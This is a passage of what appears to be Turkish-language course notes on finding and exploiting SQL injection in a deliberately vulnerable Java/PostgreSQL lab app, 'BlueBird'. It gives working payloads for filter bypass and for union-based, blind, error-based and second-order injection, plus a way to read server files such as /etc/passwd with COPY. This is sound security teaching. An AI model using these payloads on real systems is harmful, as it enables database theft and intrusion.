            "hostName": "127.0.0.1",
            "port": 8000
        }
    ]
}
```

Tüm bunlar hazırlandıktan sonra, `8000` numaralı portu yönlendirecek olan bu komutla SSH üzerinden sanal makineye bağlanın ve ardından `BlueBird`'ü remote debugging modunda başlatmak için ikinci komutu çalıştırın.

```shell-session
[!bash!]$ ssh -L 8000:127.0.0.1:8000 [email]
[!bash!]$ java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y,suspend=y -jar BlueBird-0.0.1-SNAPSHOT.jar
```

Son olarak, `VSCode`'a geri dönebilir ve debug işlemini başlatmak için `[F5]` tuşuna basabiliriz. Bunun gibi bir satır numarasının soluna tıklayarak bir breakpoint ayarlayabilirsiniz:

![Pasted image 20250428140001.png](/img/user/resimler/Pasted%20image%2020250428140001.png)

Breakpoint'li satırlara ulaşıldığında, yürütme duraklatılır, böylece değişken değerlerini inceleyebilir ve kod satırları arasında adım atarak programın akışını kontrol edebilirsiniz.

![Pasted image 20250428140035.png](/img/user/resimler/Pasted%20image%2020250428140035.png)

## Remote Debugging with Eclipse

Belki de `Eclipse` hayranısınız. Sorun değil, bu durumda süreç oldukça benzerdir. Devam edin ve aşağıdaki ayarlarla `yeni bir Java Projesi` oluşturun:

![Pasted image 20250428141605.png](/img/user/resimler/Pasted%20image%2020250428141605.png)

`BlueBird`'ün “ source ” unu `Eclipse` projesine aktaracağız, bu nedenle henüz yapmadıysanız, `Java Archives'ı Derleme` bölümünde açıklandığı gibi `Fernflower` kullanarak `BlueBird-0.0.1-SNAPSHOT.jar` dosyasını derleyin. Bu hazır olduğunda, devam edin ve derlenmiş `classes/` klasörünün içeriğini yeni oluşturduğumuz `Eclipse` projesinin `src/` klasörüne kopyalayın.

```shell-session
[!bash!]$ cp -r src/BOOT-INF/classes/* ~/eclipse-workspace/BlueBird/src
```

Bunu doğru bir şekilde yaptıysanız, `Package Explorer`'da sağ tıklayıp `Refresh` (Yenile) düğmesine bastığınızda tüm paketler (kırmızı hatalarla birlikte) görünecektir.

![Pasted image 20250428141910.png](/img/user/resimler/Pasted%20image%2020250428141910.png)

Paketlerde hata olmasının nedeni eksik importlardan kaynaklanmaktadır. Bu sorunu çözmek için, derlenmiş `JAR`'dan tüm bağımlılıkları import edeceğiz. `File > Properties > Java Build Path > Libraries > Modulepath > Add External JARs` yolunu izleyin ve `lib/` (`Fernflower` tarafından derlenirken oluşturulan) dosyasındaki tüm `JAR` dosyalarını ekleyin. `Import` edildikten sonra `Apply and Close`'a tıklayın.

![Pasted image 20250428142145.png](/img/user/resimler/Pasted%20image%2020250428142145.png)

Bu adımı doğru yaptıysanız, aşağıdaki ekran görüntüsünde gösterildiği gibi import ifadelerinde artık kırmızı hata işaretleri veya alt çizgiler olmamalıdır.

![Pasted image 20250428142300.png](/img/user/resimler/Pasted%20image%2020250428142300.png)

Bu noktada bir terminal açabilir ve JAR dosyasını remote debugging modunda başlatmak için aşağıdaki komutu çalıştırabiliriz.

```shell-session
[!bash!]$ java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y,suspend=y -jar BlueBird-0.0.1-SNAPSHOT.jar 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening for transport dt_socket at address: 8000
```

Buna bağlanmak için `Eclipse`'e geri dönmemiz, `Run > Debug Configurations`'a gitmemiz ve aşağıdaki ayarlarla (varsayılan olmalıdır) yeni bir `Remote Java Uygulaması`oluşturmamız gerekir:

![Pasted image 20250428142434.png](/img/user/resimler/Pasted%20image%2020250428142434.png)

`Apply`'a ve ardından `Debug`'a tıklayın. Konsola bakarsanız, Spring başlangıç log mesajlarını görmelisiniz.

![Pasted image 20250428142509.png](/img/user/resimler/Pasted%20image%2020250428142509.png)

Eclipse içinde **`Window > Perspective > Open Perspective > Debug`** yolunu izleyerek debug pencerelerini açın. Bu noktada projeye breakpoint (duraklama noktası) ekleyebilir ve BlueBird uygulamasını canlı olarak debug edebilirsiniz. Bunu yapmak için satır numarasına sağ tıklayıp **`Toggle Breakpoint`** seçeneğini seçin. Uygulama o satıra geldiğinde duracak ve adım adım ilerleyerek tam olarak neler olduğunu görebileceksiniz. Değişkenlerin değerlerini değiştikçe **`Variables`** penceresinde görebilirsiniz (sadece **`Debug Perspective`**'in açık olduğundan emin olun).

![Pasted image 20250428143219.png](/img/user/resimler/Pasted%20image%2020250428143219.png)

## Conclusion

Live debugging çok güçlü bir teknik olabilir, ancak gerçek kaynak kodla değil, `decompiled` kaynak kodla çalıştığımız için her zaman %100 doğru çalışmayacaktır. Sonuçta, herkesin kendi tercih ettiği çalışma tarzı vardır, bu yüzden en iyisi sadece denemek ve kendiniz görmektir.

# Hunting for SQL Errors

## PostgreSQL Loglama'yı Etkinleştirme

Çalıştırılan SQL sorgularını tespit etmek ve bir exploit geliştirirken payload'larınızı debug etmek için başka bir yöntem de **SQL loglamayı** etkinleştirmektir.

PostgreSQL'de bunu yapmak için önce `postgresql.conf` dosyasını bulmamız gerekir. Genellikle `/etc/postgresql/<sürüm>/main/` dizininde bulunur, fakat eğer orada bulamazsanız şu komutu çalıştırabilirsiniz:

```shell-session
[!bash!]$ find / -type f -name postgresql.conf 2>/dev/null
/etc/postgresql/13/main/postgresql.conf
```

Dosyayı bulduktan sonra, dosyada aşağıdaki değişiklikleri yapmamız gerekiyor:

- `#logging_collector = off` satırını `logging_collector = on` olarak değiştirin. Bu, **logging collector** adlı arka plan işlemini etkinleştirir. [kaynak](https://postgresqlco.nf/doc/en/param/logging_collector/)

- `#log_statement = 'none'` satırını `log_statement = 'all'` olarak değiştirin. Bu sayede **SELECT, CREATE, INSERT** gibi tüm sorgu türleri loglanır. [kaynak](https://postgresqlco.nf/doc/en/param/log_statement/)

- `#log_directory = '...'` satırının yorum satırını kaldırarak (başındaki `#` işaretini silerek), log dosyalarının kaydedileceği dizini tanımlayın. [kaynak](https://postgresqlco.nf/doc/en/param/log_directory/)

- `#log_filename = '...'` satırının yorum satırını kaldırarak, log dosyasının kaydedileceği dosya adını tanımlayın. [kaynak](https://postgresqlco.nf/doc/en/param/log_filename/)

Değişiklikler kaydedildikten sonra PostgreSQL'i bu şekilde yeniden başlatın:

```shell-session
[!bash!]$ sudo systemctl restart postgresql
```
  
Bu noktada, log dosyaları `log_directory` tarafından tanımlanan klasörde görünmeye başlamalıdır. Aşağıdaki komut ile log mesajlarını neredeyse gerçek zamanlı olarak izleyebiliriz:

```shell-session
[!bash!]$ sudo watch -n 1 tail <log_directory>/postgresql-2023-02-14_081533.log
<SNIP>
2023-02-14 09:06:04.819 EST [22510] bbuser@bluebird LOG:  execute <unnamed>: SELECT * FROM users WHERE username = $1
2023-02-14 09:06:04.819 EST [22510] bbuser@bluebird DETAIL:  parameters: $1 = 'bmdyy'
2023-02-14 09:06:10.423 EST [22510] bbuser@bluebird LOG:  execute <unnamed>: SELECT * FROM users WHERE username = $1
2023-02-14 09:06:10.423 EST [22510] bbuser@bluebird DETAIL:  parameters: $1 = 'admin'
2023-02-14 09:06:12.999 EST [22510] bbuser@bluebird LOG:  execute <unnamed>: SELECT * FROM users WHERE username = $1
2023-02-14 09:06:12.999 EST [22510] bbuser@bluebird DETAIL:  parameters: $1 = 'test'
2023-02-14 09:06:16.688 EST [22510] bbuser@bluebird LOG:  execute <unnamed>: SELECT * FROM users WHERE username = $1
2023-02-14 09:06:16.688 EST [22510] bbuser@bluebird DETAIL:  parameters: $1 = 'itsmaria'
```


# Common Character Bypasses

## Introduction

Normalde basit olan bir SQL enjeksiyonundan yararlanmaya çalışırken karakter sınırlamalarıyla karşılaşmak nadir değildir. Belki bir geliştirici, alanın kabul etmesine izin verilen karakterlerden oluşan bir whitelist uygulamıştır ya da belki bir WAF, “ username ”inizi belirli stringlere ayarladığınızda bundan hoşlanmamıştır. Her durumda, SQL injection payload'larınızda esnek olabilme yeteneği çok faydalı olabilir.

## Blind SQL Injection

Bir karakter filtresi ile SQL enjeksiyonunu uygulamak için, Identifying Vulnerabilities bölümünde keşfettiğimiz ilk SQLi güvenlik açığını tekrar gözden geçirelim:

```java
/ IndexController.java (Lines 50-76)

@GetMapping({"/find-user"})
public String findUser(@RequestParam String u, Model model, HttpServletResponse response) throws IOException {
    Pattern p = Pattern.compile("'|(.*'.*'.*)");
    Matcher m = p.matcher(u);
    String u2 = u.toLowerCase();
    if (!u2.contains(" ") && !m.matches()) {
        try {
        String sql = "SELECT * FROM users WHERE username LIKE '%" + u + "%'";
        List users = this.jdbcTemplate.query(sql, new BeanPropertyRowMapper(User.class));
        UserDetailsImpl userDetails = (UserDetailsImpl)SecurityContextHolder.getContext().getAuthentication().getPrincipal();
        model.addAttribute("userDetails", userDetails);
        model.addAttribute("users", users);
        return "find-user";
        } catch (BadSqlGrammarException var10) {
        System.out.println(var10.getSQLException().getMessage());
        model.addAttribute("errorMsg", "Invalid search query");
        return "error";
        } catch (Exception var11) {
        var11.printStackTrace();
        model.addAttribute("errorMsg", "Invalid search query");
        return "error";
        }
    } else {
        model.addAttribute("errorMsg", "Illegal search term");
        return "error";
    }
}
```

`.contains(" ")` çağrısı zaten kendini açıklıyor — boşluk karakteri kullanamıyoruz — bu yüzden, BlueBird'ün bir terimi "yasadışı arama terimi" olarak sayması için başka 
nelere baktığını daha iyi anlamak adına RegEx desenine bir göz atalım.

`regex101.com`'u kullanarak otomatik bir açıklama oluşturduğumuzda, desenin tek tırnakları (`'`) ve içinde iki adet tek tırnak bulunan stringleri eşleştirmeyi amaçladığını görebiliyoruz.

![Pasted image 20250428144316.png](/img/user/resimler/Pasted%20image%2020250428144316.png)

`IndexController.java`'da `u` değişkeni iki tek tırnak arasında birleştirildiğinden, bir SQL enjeksiyon payload'u tek bir tırnakla ayrılmayı gerektirecektir. Yalnızca desene dayanarak, bu mümkün görünmüyor. Ne yazık ki geliştirici için `Matcher.matches()`, yalnızca `u` değerinin tamamı kalıpla eşleşirse `true` döndürür, varsaymış olabileceği gibi yalnızca bir kısmı değil. Bunun anlamı, tek bir tırnak işareti ve tek tırnak işaretiyle çevrelenmiş stringleri algılanırken, `RegEx` deseniyle eşleşmeden bir payload'a tek bir tırnak işareti ekleyebileceğimizdir.

RegEx modeline karşı çeşitli payload'lar çalıştırarak bu varsayımı test edelim. Bunu yapmak için bunun gibi kısa bir Java programı oluşturabiliriz:

![Pasted image 20250428144914.png](/img/user/resimler/Pasted%20image%2020250428144914.png)

“`Find User`” arama çubuğuna `a'` girdiğimizde “`Invalid search query`” (Geçersiz arama sorgusu) hatasıyla karşılaşırız, ancak `a'--` denersek payload'umuzu SQL sorgusuna başarıyla enjekte ettiğimizi görürüz.

![Pasted image 20250428145018.png](/img/user/resimler/Pasted%20image%2020250428145018.png)

Uygulamayı live debug ederek ve çalıştırılan SQL sorgusunun tamamını görmek için `IndexController.java`'daki `findUser()` fonksiyonunda bir breakpoint ayarlayarak enjeksiyonu tamamen doğrulayabiliriz:

![Pasted image 20250428145103.png](/img/user/resimler/Pasted%20image%2020250428145103.png)

Ne yazık ki, `'` ve `1=1--` gibi payloadlar boşluklar nedeniyle hala başarısız olmaktadır. Ancak bunun üstesinden gelmek çok kolaydır. Tüm boşlukları PostgreSQL'in çok satırlı boş yorumlarıyla (`/**/`) değiştirebiliriz, çünkü sorgu bunu bir boşluk karakteri olarak değerlendirecek ve sorgu yine de çalışacaktır. Böylece '`/**/and/**/1=1--` payload'unu deneyebilir ve çalıştığını görebiliriz.

![Pasted image 20250428145232.png](/img/user/resimler/Pasted%20image%2020250428145232.png)

## Union-Based SQL Injection

Bu noktada blind SQL enjeksiyonu için bir PoC'ye sahibiz, ancak burada durmak zorunda değiliz. `Tek tırnak` işaretlerine geri dönecek olursak, stringleri farklı şekilde ifade ederek bu filtrenin etrafından dolaşabiliriz. PostgreSQL, daha iyi okunabilirlik için bir stringin başlangıç ve bitiş noktalarını işaretlemek için `iki dolar` işareti kullanmanıza izin verir ve bunu, tek tırnaklarla eşleşen RegEx modelini aşmak ve `union-based SQL injection` için bir PoC payloadu geliştirmek için kullanabiliriz.

Bu yüzden ‘ union select `'1’,'2',‘3’--` payload'unu denemek isteriz, ancak boşlukları ve tek tırnakları değiştirdikten sonra şöyle görünecektir: `'/**/union/**/select/**/$$1$$,$$2$$,$$3$$--`. Bunu gönderdikten sonra “Invalid Search Query” hatası alıyoruz. PostgreSQL loglarına (daha önce etkinleştirmiştik) baktığımızda, birinci ve ikinci seçimlerin farklı sayıda sütuna sahip olması nedeniyle ifadenin başarısız olduğunu görebiliriz.

```shell-session
[!bash!]$ tail /opt/bluebird/pg_log/postgresql-2023-02-15_052440.log
<SNIP>
2023-02-15 06:27:18.389 EST [14374] bbuser@bluebird ERROR:  each UNION query must have the same number of columns at character 67
2023-02-15 06:27:18.389 EST [14374] bbuser@bluebird STATEMENT:  SELECT * FROM users WHERE username LIKE '%'/**/union/**/select/**/$1$,$2$,$3$--%'
<SNIP>
```

Kodu kontrol ederek doğru sütun sayısını bulabiliriz veya başarılı olana kadar sütun eklemeye devam edebiliriz. Her iki şekilde de doğru sütun sayısı 6'dır, bu yüzden `/union/select/$$1$$,$$2$$,$$3$$,$$4$$,$$5$$,$$6$$--` payload'unu denersek, union tabanlı SQL enjeksiyonunun başarılı olduğunu görebiliriz!

![Pasted image 20250428145959.png](/img/user/resimler/Pasted%20image%2020250428145959.png)

## Comparative Precomputation (Blind SQLi)

Her ne kadar bu özel durumda union tabanlı SQL enjeksiyonunun mümkün olduğunu kanıtlamış olsak da, bir an için sadece blind SQL enjeksiyonu ile sınırlı olduğumuzu varsayalım. Veritabanından karakter dump için tipik algoritmalar kullanıldığında, her bir karakter için ortalama `7` isteğe ihtiyaç duyulur (örneğin, sqlmap'in kullandığı bölme algoritması). Ancak bazı durumlarda, bir veya daha fazla karakteri her istekte (blind bir şekilde) dump mümkün olabilir.

Aşağıdaki payload'u göz önünde bulunduralım:

`' AND id=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='itsmaria')--`

Bu sadece bir kullanıcıyla eşleşecektir ve bu kullanıcı, itsmaria'nın şifresinin ilk karakterinin ascii değeriyle aynı id'ye sahip olan kullanıcıdır. Karakter filtrelerini atlatmak için boşlukları ve tek tırnakları değiştirdiğimizde, payload şu şekilde görünecektir:

`'/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,1,1))/**/FROM/**/users/**/WHERE/**/username=$$itsmaria$$)--`

Bunu denediğimizde, ID'si `36` olan kullanıcıyı görmeliyiz ki bu, `$` karakterine karşılık gelir. Bu beklenen bir sonuçtur, çünkü şifreler bcrypt hash'leri olarak saklanır ve formatları `$2b$12$...` şeklindedir. Böylece, bir blind SQL enjeksiyonu PoC'si elde etmiş olduk ve her istekte bir karakter dump edebiliriz.

![Pasted image 20250428150235.png](/img/user/resimler/Pasted%20image%2020250428150235.png)

Not: Bu modülün amaçları doğrultusunda, açıkları 8080 numaralı port'u üzerinden canlı web sitesine karşı test etmeniz gerekir. Gerçek dünyada, istismarları herhangi bir üretim sitesinde çalıştırmadan önce her zaman local olarak test etmek/geliştirmek istersiniz. İdeal olarak, yapmanız gereken tek değişiklik IP/PORT değiştirmek olmalıdır.

----

# Error-Based SQL Injection

## Introduction

Error-based SQL injection, saldırganların veri sızdırmak için veritabanı hata mesajlarını kullandığı in-band bir tekniktir. Bu bölümde, bu tekniği daha iyi anlamak için BlueBird'de error-based bir SQL enjeksiyonunu inceleyeceğiz.


## /forgot'taki SQL Enjeksiyonuna Daha Yakından Bir Bakış

Daha önce keşfettiğimiz ikinci güvenlik açığının, client IP'sine bağlı olarak bir `stacktrace` veya genel bir hata mesajı döndüren bazı ilginç istisna işlemlerine sahip olduğunu hatırlayabilirsiniz:

```java
// AuthController.java (Lines 121-164)

@PostMapping({"/forgot"})
public String forgotPOST(@RequestParam String email, Model model, HttpServletRequest request, HttpServletResponse response) throws IOException {
    if (email.isEmpty()) {
        response.sendRedirect("/forgot?e=Please+fill+out+all+fields");
        return null;
    } else {
        Pattern p = Pattern.compile("^.*@[A-Za-z]*\\.[A-Za-z]*$");
        Matcher m = p.matcher(email);
        if (!m.matches()) {
        response.sendRedirect("/forgot?e=Invalid+email!");
        return null;
        } else {
        try {
            String sql = "SELECT * FROM users WHERE email = '" + email + "'";
            User user = (User)this.jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper(User.class));
            Long var10000 = user.getId();
            String passwordResetHash = DigestUtils.md5DigestAsHex(("" + var10000 + ":" + user.getEmail() + ":" + user.getPassword()).getBytes());
            var10000 = user.getId();
            String passwordResetLink = "https://bluebird.htb/reset?uid=" + var10000 + "&code=" + passwordResetHash;
            logger.error("TODO- Send email with link [" + passwordResetLink + "]");
            response.sendRedirect("/forgot?e=Please+check+your+email+for+the+password+reset+link");
            return null;
        } catch (EmptyResultDataAccessException var11) {
            response.sendRedirect("/forgot?e=Email+does+not+exist");
            return null;
        } catch (Exception var12) {
            String ipAddress = request.getHeader("X-FORWARDED-FOR");
            if (ipAddress == null) {
                ipAddress = request.getRemoteAddr();
            }

            if (ipAddress.equals("127.0.1.1")) {
                model.addAttribute("errorMsg", var12.getMessage());
                model.addAttribute("errorStackTrace", Arrays.toString(var12.getStackTrace()));
            } else {
                model.addAttribute("errorMsg", "500 Internal Server Error");
                model.addAttribute("errorStackTrace", "Something happened on our side. Please try again later.");
            }

            return "error";
        }
        }
    }
}
```


Ne olacağını görmek için tipik bir `' or 1=1--` enjeksiyonu yapalım.

![Pasted image 20250428195830.png](/img/user/resimler/Pasted%20image%2020250428195830.png)

RegEx kalıbı eşleşmediği için Invalid email! hatası almamız gerekir. RegEx kalıbına daha yakından baktığımızda, basitçe `<CHARS>@<CHARS>.<CHARS>` arayan oldukça gevşek bir kalıp olduğunu görebiliriz. `[email]` ifadesini yorum olarak ekleyerek bir SQL enjeksiyon payload'u sağlamaya devam ederken bunu oldukça kolay bir şekilde eşleştirebiliriz.

![Pasted image 20250428195954.png](/img/user/resimler/Pasted%20image%2020250428195954.png)

Şimdi enjeksiyonu tekrar deneyelim, bu kez `'` veya `[email]` payload'u ile.

![Pasted image 20250428200311.png](/img/user/resimler/Pasted%20image%2020250428200311.png)

Bu sefer response olarak genel bir hata mesajı aldık. Yukarıdaki koddan hatırlarsanız, bu yanıt `127.0.1.1` IP adresine sahip olmayan tüm client'lerde sunulur, bu da muhtemelen local debugging içindir. IP kontrolü ile ilgili olarak, geliştiriciler çok yaygın bir hata yapmışlardır. [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) header'ı ilk olarak sağlanıp sağlanmadığını görmek için kontrol edilir. Bu, proxy'lerin orijinal client IP'sini not etmek için kullandıkları bir header'dır. Sorun şu ki, header client (proxy) tarafından sağlandığından, saldırganlar olarak istediğimiz değeri sağlayabiliriz.

Bunu bilerek, aynı payload'u tekrar göndermeyi deneyebiliriz, ancak bu sefer isteği `Burp` ile kesip `X-Forwarded-For` header'ını ekleyebiliriz:

![Pasted image 20250428200540.png](/img/user/resimler/Pasted%20image%2020250428200540.png)

Request'i ilettikten sonra, sunucudan stack trace de dahil olmak üzere daha ayrıntılı bir response almalıyız.

![Pasted image 20250428200612.png](/img/user/resimler/Pasted%20image%2020250428200612.png)

Bu kez şuna benzer bir hata mesajı görmemiz gerekir. Özellikle bu durumda, users tablosundan yalnızca bir satır beklenirken tüm satırlar döndürüldüğü için bir hata oluştu, ancak daha ilginç olan nokta, hata mesajlarının bize döndürülmesidir.

## Exploiting the SQL Injection

Şimdi PostgreSQL'i bir hatayla karşılaşmaya ve bize dönen mesajdaki bilgileri ortaya çıkarmaya zorlayalım. Error-based SQL injection söz konusu olduğunda popüler bir teknik, uygun olmayan bir STRING'i INT'e dönüştürmektir çünkü değer hata mesajında görüntülenecektir. Bunu test etmek için, `' AND 0=CAST((SELECT VERSION()) AS INT)[email]` payload'unu kullanarak veritabanının sürümünü sızdırmayı deneyebiliriz.

![Pasted image 20250428201141.png](/img/user/resimler/Pasted%20image%2020250428201141.png)

Bu sefer hata mesajında ilginç bir şey fark edeceksiniz. PostgreSQL, `VERSION()` fonksiyonunu beklendiği gibi bir INT'e dönüştüremiyor ve bu nedenle bize döndürülen hata mesajında değeri yazdırıyor.

Aynı teknik veritabanından hemen hemen her şeyi sızdırmak için kullanılabilir; sadece yaratıcı olmanız gerekir. Örneğin, aşağıdaki gibi bir tablo adı alabiliriz:

```sql
' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)[email]
```


Hedeflediğiniz belirli SQL enjeksiyonu güvenlik açığında sorguları stack etmek mümkünse, bunun gibi tüm tabloları veya veritabanlarını bir kerede dump etmek için [XML fonksiyonlarını](https://www.postgresql.org/docs/9.4/functions-xml.html) bile kullanabilirsiniz:

```sql
';SELECT CAST(CAST(QUERY_TO_XML('SELECT * FROM posts LIMIT 2',TRUE,TRUE,'') AS TEXT) AS INT)[email protected]
```

![Pasted image 20250428201414.png](/img/user/resimler/Pasted%20image%2020250428201414.png)

# Second-Order SQL Injection

## Introduction

Second-order SQL injection, kullanıcı inputunun uygulama tarafından depolandığı ve daha sonra bir SQL sorgusunda güvenli olmayan bir şekilde kullanıldığı bir SQL injection türüdür. Bu tür bir güvenlik açığını tespit etmek daha zor olabilir, çünkü genellikle verileri depolamak ve daha sonra kullanmak için ayrı uygulama işlevleriyle etkileşim gerektirir.


## /profile içindeki SQL enjeksiyonunu genişletme

Bu bölümde, Identifying Vulnerabilities bölümlerinde tespit ettiğimiz üçüncü SQLi zafiyetine daha yakından bakacağız:

```java
// ProfileController.java

@GetMapping({"/profile/{id}"})
public String profile(@PathVariable int id, Model model, HttpServletResponse response) throws IOException {
    String sql;
    User user;
    try {
        sql = "SELECT username, name, description, email, id FROM users WHERE id = ?";
        user = (User)this.jdbcTemplate.queryForObject(sql, new Object[]{id}, new BeanPropertyRowMapper(User.class));
    } catch (Exception var8) {
        response.sendRedirect("/");
        return null;
    }

    sql = "SELECT text, to_char(posted_at, 'dd.mm.yyyy, hh:mi') as posted_at_nice, username, name, author_id FROM posts JOIN users ON posts.author_id = users.id WHERE email = '" + user.getEmail() + "' ORDER BY posted_at DESC";
    List posts = this.jdbcTemplate.queryForList(sql);
    model.addAttribute("user", user);
    model.addAttribute("posts", posts);
    UserDetailsImpl userDetails = (UserDetailsImpl)SecurityContextHolder.getContext().getAuthentication().getPrincipal();
    model.addAttribute("userDetails", userDetails);
    return "profile";
}
```

Bu fonksiyonda iki sorgu yapılır:

1. İlk sorgu, kullanıcı adını (`username`), ismi (`name`), açıklamayı (`description`), e-posta adresini (`email`) ve kimlik (`id`) değerlerini, path içerisindeki `{id}` ile eşleşen kullanıcıdan (users tablosundan) seçer. Bu değerler daha sonra bir User (Kullanıcı) objesini başlatmak (initialize) için kullanılır.  

2. İkinci sorgu ise, az önce oluşturduğumuz User nesnesinin e-posta adresiyle eşleşen kullanıcının yaptığı gönderileri (posts) seçer.


İkinci sorguda kullandığımız `email` ilk sorgunun bir sonucu olarak veritabanından gelmiş olsa da, sorguya birleştirilmiş olduğu için bu hala güvensizdir. Bilinen bir kimlik için `email` değerini ayarlamanın bir yolunu bulabilirsek, `second-order bir SQL enjeksiyonundan` yararlanabilmeliyiz, o zaman.

Öyleyse biraz `input tracing` yapalım ve `email` değerini nerede/nasıl ayarlayabileceğimizi bulalım. SQL'de bir değeri güncellemek için `UPDATE` anahtar sözcüğünü kullanmanız gerekir, bu nedenle projede bunun için grep yapabiliriz:

```shell-session
[!bash!]$ grep -irnE 'UPDATE.*email'
com/bmdyy/bluebird/controller/ProfileController.java:70:               sql = "UPDATE users SET name = ?, description = ?, email = ?";
com/bmdyy/bluebird/controller/ProfileController.java:85:                  this.jdbcTemplate.update(sql, new Object[]{name, description, email, passwordHash, userDetails.getId()});
com/bmdyy/bluebird/controller/ProfileController.java:87:                  this.jdbcTemplate.update(sql, new Object[]{name, description, email, userDetails.getId()});
```

Sonuçlar, `emaili` içeriyor gibi görünen bir `UPDATE` sorgusu gösteriyor. Daha yakından baktığımızda, `editProfilePOST()` içinde `/profile/edit` adresine `POST` istekleriyle eşleşen satırı buluyoruz. Bu fonksiyon, `emaili` de dahil olmak üzere oturum açtığımız kullanıcının kullanıcı ayrıntılarını düzenlememizi sağlar.

```java
@PostMapping({"/profile/edit"})
public void editProfilePOST(@RequestParam String name, @RequestParam String description, @RequestParam String email, @RequestParam(required = false) String password, @RequestParam(required = false) String repeatPassword, HttpServletResponse response) throws IOException {
<SNIP>
    sql = "UPDATE users SET name = ?, description = ?, email = ?";
<SNIP>
    sql = sql + " WHERE id = ?";
<SNIP>
    this.jdbcTemplate.update(sql, new Object[]{name, description, email, userDetails.getId()});
<SNIP>
}
```

Bu noktada, email değerini kontrol edebileceğimizi ve bunun da savunmasız SQL sorgusuna (`second-order`) aktarılacağını doğruladık. Dikkat edilmesi gereken önemli bir nokta, `editProfilePOST()` içinde kullanıcının `emailini` güncellemek için SQL sorgusunun `parametrelendirilmiş` olmasıdır. Bu sorguda SQL enjeksiyonu güvenlik açığı yoktur.

## Exploiting Second-Order SQL Injection

Güvenlik açığı tespit edildiğinde, ikinci dereceden SQL enjeksiyonundan yararlanmak, payload'u ayarlamanın ve payload'u 'çalıştırmanın' `iki` ayrı istek olması dışında normal SQL enjeksiyonundan farklı değildir.

İlk olarak, BlueBird'de oturum açmamız ve `/profile/edit`'e gitmemiz gerekiyor, böylece kullanıcımızın emailini ayarlayabiliriz.

![Pasted image 20250428220713.png](/img/user/resimler/Pasted%20image%2020250428220713.png)

`email/payload`'umuz `/profile/{id}` içinde kullanılacağından, içine enjekte edeceğimiz `SQL` sorgusunu aklımızda tutmamız gerekir:

```sql
SELECT text, to_char(posted_at, 'dd.mm.yyyy, hh:mi') as posted_at_nice, username, name, author_id FROM posts JOIN users ON posts.author_id = users.id WHERE email = '" + user.getEmail() + "' ORDER BY posted_at DESC
```

Bir gönderi listesi döndürüldüğünden, bir seçenek, aşağıdaki gibi bir payload ile kolayca veri sızdırmak için union based SQL injection kullanmak olabilir:

```sql
' UNION SELECT 1,2,3,4,5--
```

Bu payload'u girebilir ve payload'u ''set etmek'' için `Update Details`'e tıklayabilir ve ardından tetiklenmesi için kullanıcılarımızın `Profil` sayfasını yükleyebiliriz.

![Pasted image 20250428220950.png](/img/user/resimler/Pasted%20image%2020250428220950.png)

Ne yazık ki, bu tam payload bir `SQL hatasına` yol açacaktır, ancak bunu kolayca çözebiliriz. Log dosyasındaki hata mesajına tekrar baktığımızda, **character varying** tipi ile **integer** tipinin eşleşemediğini görebiliyoruz:

![Pasted image 20250428221054.png](/img/user/resimler/Pasted%20image%2020250428221054.png)

Bu, bazı sütunların **VARCHAR** tipinde olması gerektiği, ancak bizim 5 adet **INTEGER** değeriyle `UNION` yapmaya çalıştığımız anlamına geliyor. Sütunların hangi tipte olması gerektiğini anlamanın birden fazla yolu var; en kolay yöntem, hata mesajında listelenen tam sorguya bakıp veri tiplerini çıkarmaktır.  
**text**, **posted_at_nice**, **username** ve **name** sütunlarının büyük ihtimalle **VARCHAR**, **author_id** sütununun ise muhtemelen **INTEGER** olduğunu görebiliriz.  

Bu teorimizi test etmek için payload'ımızı `' UNION SELECT '1','2','3','4',5--` şeklinde değiştirip tekrar deneyebiliriz:

![Pasted image 20250428221150.png](/img/user/resimler/Pasted%20image%2020250428221150.png)

# Reading and Writing Files

## Introduction

Daha sonra, özellikle PostgreSQL veritabanlarını hedef alan SQL enjeksiyonlarından yararlanırken kullanabileceğimiz tekniklere bakacağız.

Bu bölümde, server'a ve server'dan dosya okumak ve yazmak için kullanabileceğimiz iki yönteme göz atacağız ve ardından pratik yapmak için BlueBird'de etkileşimli bir örneği ele alacağız.

## Method 1: COPY

PostgreSQL enjeksiyonu aracılığıyla sunucudaki dosyalarla etkileşim kurmanın ilk yöntemi built-in [COPY](https://www.postgresql.org/docs/current/sql-copy.html) komutunu kullanmaktır. Bu komutun kullanım amacı tabloları import/export etmektir, ancak hemen hemen her şeyi okumak için kullanabiliriz. Dosya işlemleri sistemde `postgres` kullanıcısı olarak çalışır, bu nedenle dosyaları yalnızca kullanıcının izinlerine göre okumanın/yazmanın mümkün olduğunu unutmayın.

#### Reading Files

Dosya sisteminden bir dosya okumak için COPY FROM syntax'ını kullanarak bir dosyadaki verileri veritabanındaki bir tabloya kopyalayabiliriz. İşleri kolaylaştırmak için, bir text sütunu olan geçici bir tablo oluşturabilir, hedef dosyamızın içeriğini içine kopyalayabilir ve ardından içeriği aşağıdaki gibi seçtikten sonra bırakabiliriz:

```shell-session
bluebird=# CREATE TABLE tmp (t TEXT);
CREATE TABLE
bluebird=# COPY tmp FROM '/etc/passwd';
COPY 59
bluebird=# SELECT * FROM tmp LIMIT 5;
                        t                        
-------------------------------------------------
 root:x:0:0:root:/root:/usr/bin/zsh
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
(5 rows)

bluebird=# DROP TABLE tmp;
DROP TABLE
```

Dosyaları okumak için `COPY` kullanmanın bir sorunu, verilerin sütunlara ayrılmasını beklemesidir. Varsayılan olarak `\t`'yi bir sütun olarak ele alır, bu nedenle `/etc/hosts` gibi bir dosyayı okumaya çalışırsanız bu hatayla karşılaşırsınız:

```shell-session
bluebird=# COPY tmp FROM '/etc/hosts';
ERROR:  extra data after last expected column
CONTEXT:  COPY tmp, line 1: "127.0.0.1  localhost"
```

